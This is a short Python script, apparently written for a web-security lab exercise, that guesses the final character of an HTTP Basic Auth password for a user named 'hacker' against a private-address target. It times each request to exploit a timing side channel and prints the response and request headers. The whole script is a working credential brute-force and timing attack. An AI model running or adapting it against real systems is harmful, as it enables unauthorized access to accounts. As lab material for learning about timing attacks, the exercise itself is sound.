import requests, json, http.client, urllib, datetime, base64

chaArray = "abcdefghijklmnopqrstuvwxyz0123456789"
chaArray = "de"

for ch in chaArray:
    account = "hacker:p4ssw0r" + ch
    url = "http://192.168.56.13/authentication/example2/"
    password = base64.b64encode(account.encode("utf-8")).decode("utf-8")
    headers = {"Authorization": "Basic " + password}

    start = datetime.datetime.now()
    res = requests.get(url=url, headers=headers)
    diff = datetime.datetime.now() - start

    print(account, ">>>", diff, res.status_code, res.reason)
    print(json.dumps(dict(res.headers), indent=4))
    print(json.dumps(dict(res.request.headers), indent=4))
